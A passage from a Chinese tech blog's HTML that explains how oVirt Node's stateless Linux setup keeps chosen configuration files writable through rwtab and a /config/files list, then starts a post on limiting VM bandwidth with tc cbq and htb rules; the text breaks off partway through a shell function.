plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Set to &#x27;yes&#x27; to mount various temporary state as either tmpfs</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># or on the block device labelled RW_LABEL. Implied by READONLY</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">TEMPORARY_STATE</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">no</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Place to put a tmpfs for temporary scratch writable space</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">RW_MOUNT</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/var/lib/stateless/writable</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Label on local filesystem which can be used for temporary scratch space</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">RW_LABEL</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">stateless-rw</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Options to use for temporary mount</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">RW_OPTIONS</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Label for partition with persistent data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">STATE_LABEL</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">CONFIG </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Where to mount to the persistent data</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">STATE_MOUNT</span><span class="token operator" style="color:#393A34">=</span><span class="token plain">/config</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Options to use for peristent mount</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">STATE_OPTIONS</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># NFS server to use for persistent data?</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token assign-left variable" style="color:#36acaa">CLIENTSTATE</span><span class="token operator" style="color:#393A34">=</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>就是这个了，首先它把READONLY设置为yes，然后使用设备的LABEL号来指定需要挂载为读写的设备，然后就是挂载的位置STATE_MOUNT</p><p>同时还有/etc/rwtab以及rwtab.d目录与这个有关：
/etc/rwtab</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/adjtime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/ntp.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/resolv.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/.cache</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/archive</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#files /etc/lvm/backup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面这几项在ovirt-node里是被注释掉了的，它使用自己的方式来变更这几个文件</p><p>/etc/rwtab.d/ovirt</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">files /etc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/multipath</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/net-snmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /var/lib/dnsmasq</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /root/.ssh</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /root/.uml</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /root/.virt-manager</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dirs /home/admin/.virt-manager</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/cache/libvirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/empty/sshd/etc/localtime</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/lib/libvirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/lib/multipath</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /var/cache/multipathd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /mnt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /live</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">files /boot</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /boot-kdump</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">empty /cgroup</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>上面这些是ovirt自定义的。最后就是看/config下面的files文件:</p><p>/config/files</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">/etc/fstab</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/shadow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/default/ovirt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_dsa_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_dsa_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_rsa_key</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/ssh_host_rsa_key.pub</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/iscsi/initiatorname.iscsi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-eth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-breth0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network-scripts/ifcfg-eth1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ntp.conf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/sysconfig/network</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/hosts</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/shadow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/etc/ssh/sshd_config</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>此列表内的文件就是rc.sysinit需要读取的，把他们一个个挂载为读写，这样就实现了可修改配置文件白名单，于是我就动手修改了系统里的这些文件，重启，一切看似正常，但是当关机的时候新的问题出现了，关机的时候提示/etc无法被卸载，为什么呢，然后就找到与关机有关的脚本：</p><p>diff /etc/rc.d/init.d/halt.orig /etc/rc.d/init.d/halt</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">141c141</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt; LANG=C __umount_loop &#x27;$2 ~ /^\/$|^\/proc|^\/dev/{next}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">---</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&gt; LANG=C __umount_loop &#x27;$2 ~ /^\/$|^\/proc|^\/etc|^\/dev/{next}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>原来在halt文件里也做了“手脚”，把/etc给加了进去，重启，修改，关机，一切正常。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="参考文档">参考文档<a class="hash-link" href="#参考文档" title="标题的直接链接">​</a></h2><p>下面是可以参考的文档</p><ul><li><a href="http://fedoraproject.org/wiki/StatelessLinux/PrepareImage" target="_blank" rel="noopener noreferrer">http://fedoraproject.org/wiki/StatelessLinux/PrepareImage</a></li><li><a href="http://fedoraproject.org/wiki/StatelessLinux/HOWTO" target="_blank" rel="noopener noreferrer">http://fedoraproject.org/wiki/StatelessLinux/HOWTO</a></li><li><a href="http://blog.csdn.net/jcwkyl/article/details/6120547" target="_blank" rel="noopener noreferrer">http://blog.csdn.net/jcwkyl/article/details/6120547</a></li><li><a href="http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem" target="_blank" rel="noopener noreferrer">http://plone.lucidsolutions.co.nz/linux/io/using-centos-5.2-stateless-linux-support-on-a-flash-based-root-filesystem</a></li><li>FYI: <a href="http://ovirt.org/wiki/File:Ovirt-node.pdf" target="_blank" rel="noopener noreferrer">http://ovirt.org/wiki/File:Ovirt-node.pdf</a> (page 26)</li></ul></div><footer class="row docusaurus-mt-lg"><div class="col"><b>标签：</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/ovirt">ovirt</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/notes/blog/tags/stateless">stateless</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/notes/blog/2013/03/01/libvirt-tc-bandwidth-control">使用libvirt和tc实现vm带宽控制</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2013-03-01T00:00:00.000Z" itemprop="datePublished">2013年3月1日</time> · <!-- -->阅读需 4 分钟</div></header><div class="markdown" itemprop="articleBody"><blockquote><p>在kvm虚拟机管理的过程当中，对虚拟机带宽进行良好的控制是十分重要的。</p></blockquote><ul><li>Kramdown table of contents
{:toc .toc}</li></ul><p>linux系统当中对网络带宽的控制一般都是使用tc命令实现，tc即是traffic control的缩写，在<a href="http://linux-ip.net/articles/Traffic-Control-HOWTO/" target="_blank" rel="noopener noreferrer">这里</a>可以找到有关tc命令的内容。</p><p>当然你可以手动使用tc命令来处理这些事情，比如使用cbq队列，htb队列等，都是可以实现的，网上找找应该有很多关于这方面的资料，</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cbq队列示例">cbq队列示例<a class="hash-link" href="#cbq队列示例" title="标题的直接链接">​</a></h2><p>比如下面就是使用cbq队列限制src ip为192.168.1.102发送数据包的速率:</p><h3 class="anchor anchorWithStickyNavbar_LWe7" id="1建立cbq队列">1.建立cbq队列<a class="hash-link" href="#1建立cbq队列" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc qdisc add dev eth0 root handle 1: cbq avpkt 1000 bandwidth 100mbit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="2建立带宽限制分类">2.建立带宽限制分类<a class="hash-link" href="#2建立带宽限制分类" title="标题的直接链接">​</a></h3><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:1 cbq rate 60mbit allot 1500 prio 5 bounded isolated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:2 cbq rate 70mbit allot 1500 prio 5 bounded isolated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tc class add dev eth0 parent 1: classid 1:3 cbq rate 80mbit allot 1500 prio 5 bounded isolated</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h3 class="anchor anchorWithStickyNavbar_LWe7" id="3建立过滤器">3.建立过滤器<a class="hash-link" href="#3建立过滤器" title="标题的直接链接">​</a></h3><p>绑定指定带宽限制类型至指定虚拟机ip:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">tc filter add dev eth0 parent 1: protocol ip prio 16 u32 match ip src 192.168.1.102 flowid 1:2</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="htb队列示例">htb队列示例<a class="hash-link" href="#htb队列示例" title="标题的直接链接">​</a></h2><p>我们可以在母机上给vm对应的虚拟网卡增加tc规则，使用htb队列，一个可用的脚本示例如下：</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># add interface bandwidth limit</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># usage: tc_add iface in_kbps out_kbps</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function-name function" style="color:#d73a49">tc_add</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">iface</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">in_bw</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$2</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">out_bw</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">in_average</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">${in_bw}</span><span class="token string" style="color:#e3116c">kbps&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">in_peak</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">${in_bw}</span><span class="token string" style="color:#e3116c">kbps&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">out_average</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">${out_bw}</span><span class="token string" style="color:#e3116c">kbps&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">out_peak</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;</span><span class="token string variable" style="color:#36acaa">${out_bw}</span><span class="token string" style="color:#e3116c">kbps&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">burst</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;2kb&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">mtu</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1500</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">r2q</span><span class="token operator" style="color:#393A34">=</span><span class="token variable" style="color:#36acaa">$((</span><span class="token variable" style="color:#36acaa">in_bw</span><span class="token variable operator" style="color:#393A34">*</span><span class="token variable number" style="color:#36acaa">1000</span><span class="token variable operator" style="color:#393A34">/</span><span class="token variable" style="color:#36acaa">mtu</span><span class="token variable operator" style="color:#393A34">-</span><span class="token variable number" style="color:#36acaa">1</span><span class="token variable" style="color:#36acaa">))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">tc</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&quot;/sbin/tc&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$r2q</span><span class="token plain"> -lt </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;&amp;</span><span class="token plain"> </span><span class="token assign-left variable" style="color:#36acaa">r2q</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$in_bw</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> root handle </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: htb default </span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> r2q </span><span class="token variable" style="color:#36acaa">$r2q</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> class </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">: classid </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:1 htb rate </span><span class="token variable" style="color:#36acaa">$in_average</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ceil </span><span class="token variable" style="color:#36acaa">$in_peak</span><span class="token plain"> burst </span><span class="token variable" style="color:#36acaa">$burst</span><span class="token plain"> cburst </span><span class="token variable" style="color:#36acaa">$burst</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> class </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:1 classid </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:2 htb rate </span><span class="token variable" style="color:#36acaa">$in_average</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            ceil </span><span class="token variable" style="color:#36acaa">$in_peak</span><span class="token plain"> burst </span><span class="token variable" style="color:#36acaa">$burst</span><span class="token plain"> cburst </span><span class="token variable" style="color:#36acaa">$burst</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:2 handle </span><span class="token number" style="color:#36acaa">2</span><span class="token plain">: sfq perturb </span><span class="token number" style="color:#36acaa">10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> filter </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent </span><span class="token number" style="color:#36acaa">1</span><span class="token plain">:0 protocol </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> handle </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> fw flowid </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$out_bw</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">!=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> qdisc </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> ingress</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token variable" style="color:#36acaa">$tc</span><span class="token plain"> filter </span><span class="token function" style="color:#d73a49">add</span><span class="token plain"> dev </span><span class="token variable" style="color:#36acaa">$iface</span><span class="token plain"> parent ffff: protocol </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> u32 match </span><span class="token function" style="color:#d73a49">ip</span><span class="token plain"> src </span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token number" 